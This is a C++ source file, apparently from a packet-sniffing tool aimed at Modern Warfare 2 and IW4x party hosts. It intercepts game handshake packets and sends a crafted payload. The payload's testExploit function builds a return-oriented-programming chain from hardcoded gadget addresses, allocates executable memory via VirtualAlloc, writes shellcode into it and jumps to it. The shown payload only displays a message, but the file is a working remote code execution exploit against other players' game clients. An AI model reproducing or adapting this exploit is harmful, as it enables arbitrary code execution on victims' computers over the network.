#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

#include "Game/MW2/Handler.hpp"
#include "Game/MW2/Client.hpp"

#include "Extern/Huffman.hpp"

//#define USE_IW4X

#ifdef USE_IW4X

#define UNUSED_MEMORY_POINTER 0x64A3050
#define UNUSED_DATA_POINTER 0x64A3071
#define RESTORE_SERVER_CONTEXT 0x4B2412

#define ORG_PARAM 0x31D9390

#else

#define UNUSED_MEMORY_POINTER 0x642D718
#define UNUSED_DATA_POINTER 0x642D738
#define RESTORE_SERVER_CONTEXT 0x56A092

#define ORG_PARAM 0x3172010

#endif

void allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
{
	// Allocate executable memory
	stack->push_back(0x401000 + 0x00077a0a);  // pop esi
	stack->push_back(0x67D1E4);               // IAT: VirtualAlloc

	stack->push_back(0x401000 + 0x0017f5c8);  // mov eax, [esi]; pop esi
	stack->push_back(0);                      // padding

	stack->push_back(0x401000 + 0x000ded54);  // jmp eax

	stack->push_back(0x401000 + 0x00077a0a);  // pop esi - for saving the memory pointer

	stack->push_back(0);                      // addr
	stack->push_back(size);                   // size
	stack->push_back(MEM_COMMIT);             // addr
	stack->push_back(PAGE_EXECUTE_READWRITE); // permissions

											  // Save memory pointer
	stack->push_back(address);                // Target address
	stack->push_back(0x401000 + 0x00193450);  // mov [esi], eax
}

void writeDataInEax(std::vector<DWORD>* stack, std::string data)
{
	while (data.size() % 4) data.push_back(0);
	for (size_t i = 0; i < data.size(); i += 4)
	{
		stack->push_back(0x401000 + 0x000021a1);    // pop ecx
		stack->push_back(*PDWORD(data.data() + i)); // data
		stack->push_back(0x401000 + 0x00029059);    // mov [eax], ecx
		stack->push_back(0x401000 + 0x00254ab9);    // add eax, 3
		stack->push_back(0x401000 + 0x00064844);    // add eax, 1
	}
}

void freeMemory(std::vector<DWORD>* stack, DWORD address)
{
	stack->push_back(0x401000 + 0x00249982); // pop edx
	stack->push_back(address);

	stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

	stack->push_back(0x401000 + 0x00249982); // pop edx
	stack->push_back(0x5B7880); // Z_VirtualFreeInternal

	stack->push_back(0x401000 + 0x00000039); // mov [esp + 4], eax; jmp edx

	stack->push_back(0x401000 + 0x00249982); // pop edx
	stack->push_back(0); // placeholder
}

void writeData(std::vector<DWORD>* stack, DWORD address, std::string data)
{
	data.push_back(0);
	while (data.size() % 4) data.push_back(0);

	stack->push_back(0x401000 + 0x00077a0a); // pop esi

	for (unsigned int i = 0; i < data.size(); i += 4)
	{
		stack->push_back(*(DWORD*)(data.data() + i));
		stack->push_back(0x401000 + 0x000421fe); // pop eax
		stack->push_back(address + i);
		stack->push_back(0x401000 + 0x00077a08); // mov [eax], esi; pop esi
	}

	stack->push_back(0);
}

std::string testExploit()
{
	std::vector<DWORD> stack;

	freeMemory(&stack, UNUSED_MEMORY_POINTER);

	writeData(&stack, UNUSED_DATA_POINTER, "Hallo Uli");

	stack.push_back(0x5CB620);              // Sys_ShowErrorText
	stack.push_back(0x401000 + 0x00249982); // pop edx
	stack.push_back(UNUSED_DATA_POINTER);   // message

	stack.push_back(RESTORE_SERVER_CONTEXT); // restore server

	static unsigned char shellcode[] =
	{
		0x81, 0xEC, 0x70, 0x08, 0x00, 0x00, // sub esp, 870h
		0xC3                                // retn
	};

	std::vector<DWORD> fixup;
	fixup.push_back(0x56991E);  // pop eax
	fixup.push_back(ORG_PARAM); // old param? not really, but whatever

	allocateMemory(&fixup, UNUSED_MEMORY_POINTER, (sizeof(shellcode) + 3) & ~3);
	writeDataInEax(&fixup, std::string((char*)shellcode, sizeof shellcode));

	// Execute shellcode
	fixup.push_back(0x401000 + 0x00249982); // pop edx
	fixup.push_back(UNUSED_MEMORY_POINTER);
	fixup.push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

	fixup.push_back(0x401000 + 0x000ded54); // jmp eax

	std::string data;
	data.append(LPSTR(stack.data()), stack.size() * 4);
	data.resize(0x800);
	data.append(LPSTR(fixup.data()), fixup.size() * 4);

	return data;
}

namespace Game
{
	namespace MW2
	{
		Client::Client(Handler* _handler, Network::Address _target) : handler(_handler), target(_target)
		{
			this->onOOB("challengeResponse", [this](Network::Sniffer* /*sniffer*/, Network::Interface* /*networkIf*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				this->challenge = strtoul(data.data(), nullptr, 10);
			});

			this->onOOB("stats", [this](Network::Sniffer* sniffer, Network::Interface* networkIf, std::string data, bool receiving)
			{
				if (receiving || !this->lastStatPacket) return;
				this->lastStatPacket = false;

				this->sendInitialPayload(sniffer, networkIf);
			});

			this->onOOB("statResponse", [this](Network::Sniffer* /*sniffer*/, Network::Interface* /*networkIf*/, std::string data, bool receiving)
			{
				if (!receiving) return;
				while (!data.empty() && data.back() == 0) data.pop_back();

				if (atoi(data.data()) == 64)
				{
					this->lastStatPacket = true;
				}
			});

			this->onOOB("connect", [this](Network::Sniffer* /*sniffer*/, Network::Interface* /*networkIf*/, std::string data, bool receiving)
			{
				static std::regex infoStringRegex("([0-9a-fA-F]+) \"(.+)\"");

				if (!receiving)
				{
					std::smatch match;
					if (std::regex_search(data, match, infoStringRegex) && match.size() >= 3)
					{
						Utils::InfoString info(match[2]);
						this->qport = USHORT(atoi(info.get("qport").data()));
						this->xuid = strtoull(info.get("xuid").data(), nullptr, 16);

						printf("Connecting to party at %s with xuid %llX as %s\n", this->target.toString().data(), this->xuid, info.get("name").data());
					}
				}
			});

			this->onOOB("connectResponse", [this](Network::Sniffer* /*sniffer*/, Network::Interface* /*networkIf*/, std::string /*data*/, bool receiving)
			{
				if (receiving)
				{
					printf("Connected to server!\n");
					/*MessageBoxA(0, 0, 0, 0);
					this->send(sniffer, networkIf, "\xFF\xFF\xFF\xFF" "relay 1234567890");*/
				}
			});
		}

		Client::~Client()
		{

		}

		void Client::sendInitialPayload(Network::Sniffer* sniffer, Network::Interface* networkIf)
		{
			Utils::Buffer buffer;

#ifdef USE_IW4X
			buffer.write<int>(-2);  // IW4x Magic
#endif

			buffer.write<int>(1);
			buffer.write<short>(this->qport); // qport

			buffer.write<char>(0);
			buffer.write<int>(0);
			buffer.write<int>(0);

			auto doHuffman = [](std::string data)
			{
				Huffman_InitMain();

				Utils::Memory::Allocator allocator;
				u_char* target = allocator.allocateArray<u_char>(0x10000 + data.size() * 2);

				int size = MSG_WriteBitsCompress(0, reinterpret_cast<const u_char*>(data.data()), target, data.size());
				return std::string(LPSTR(target), size);
			};

			std::string compr = doHuffman(testExploit());

			for (auto& chr : compr)
			{
				chr ^= char(this->challenge);
			}

			buffer.append(compr);

			this->send(sniffer, networkIf, buffer);
			printf("Sending bytes %s\n", Utils::String::DumpHex(buffer, " ").data());
		}

		void Client::onOOB(std::string command, Callback callback)
		{
			this->oobHandlers[Utils::String(command).toLower()] = callback;
		}

		void Client::send(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string data)
		{
			if (this->packetTemplate.empty()) return;

			Utils::Buffer buffer(this->packetTemplate);
			PBYTE buf = PBYTE(buffer.data());

			ipHeader* ih = nullptr;

			int dlt = pcap_datalink(networkIf->handle);
			if (dlt == DLT_NULL)
			{
				loopbackHeader* protoHeader = reinterpret_cast<loopbackHeader*>(buf);
				if (protoHeader->type == 2) // IPv4
				{
					ih = reinterpret_cast<ipHeader *>(buf + sizeof(loopbackHeader));
				}
			}
			else if (dlt == DLT_EN10MB)
			{
				ethHeader* protoHeader = reinterpret_cast<ethHeader*>(buf);
				if (protoHeader->type == 8) // IPv4
				{
					ih = reinterpret_cast<ipHeader *>(buf + sizeof(ethHeader));
				}
			}

			// Invalid data link type, ip version or protocol
			if (!ih || ih->proto != IPPROTO_UDP) return;

			ih = reinterpret_cast<ipHeader *>(buf + sizeof(ethHeader));

			u_int ipLen = (ih->ver_ihl & 0xF) * 4;
			ih->tlen = htons(u_short(ipLen + sizeof(udpHeader) + data.size()));

			ih->crc = 0;
			ih->crc = Utils::Network::IPChecksum(reinterpret_cast<u_short*>(ih), u_short(ipLen));

			udpHeader* uh = reinterpret_cast<udpHeader *>(PBYTE(ih) + ipLen);
			uh->len = htons(u_short(data.size() + sizeof(udpHeader)));
			uh->crc = 0;
			uh->crc = Utils::Network::UDPChecksum(ih->saddr, ih->daddr, ntohs(uh->sport), ntohs(uh->dport), ih->proto, data);

			buffer.append(data);

			sniffer->send(networkIf, buffer);
		}

		int Client::getDirection(Network::Address source, Network::Address _target)
		{
			if (source == this->target) return Client::PacketDirection::REMOTE_TO_LOCAL;
			if (_target == this->target) return Client::PacketDirection::LOCAL_TO_REMOTE;

			return Client::PacketDirection::NONE;
		}

		void Client::handle(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string_view data, std::string_view rawData, bool receiving)
		{
			if (!receiving && this->packetTemplate.empty())
			{
				this->packetTemplate = rawData.substr(0, rawData.size() - data.size());
			}

			if (!this->handleOOB(sniffer, networkIf, data, receiving))
			{
				this->handleNetchan(sniffer, networkIf, data, receiving);
			}
		}

		bool Client::handleOOB(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string_view data, bool receiving)
		{
			if (data.size() >= 4 && !std::memcmp(data.data(), "\xFF\xFF\xFF\xFF", 4))
			{
				Utils::String command;
				for (auto i = data.begin() + 4; i != data.end(); ++i)
				{
					if (*i == '\0' || *i == '\n' || *i == ' ' || (i + 1) == data.end())
					{
						command = std::string(data.begin() + 4, i);
						break;
					}
				}

				std::string buffer;
				if (data.size() >= command.size() + 5)
				{
					buffer = std::string(data.begin() + command.size() + 5, data.end());
				}

				auto callback = this->oobHandlers.find(command.toLower());
				if (callback != this->oobHandlers.end())
				{
					callback->second(sniffer, networkIf, buffer, receiving);
				}

				return true;
			}

			return false;
		}

		void Client::handleNetchan(Network::Sniffer* sniffer, Network::Interface* networkIf, std::string_view data, bool receiving)
		{
			// TODO Keep track of the natchan state
			sniffer; networkIf; data; receiving;
		}
	}
}
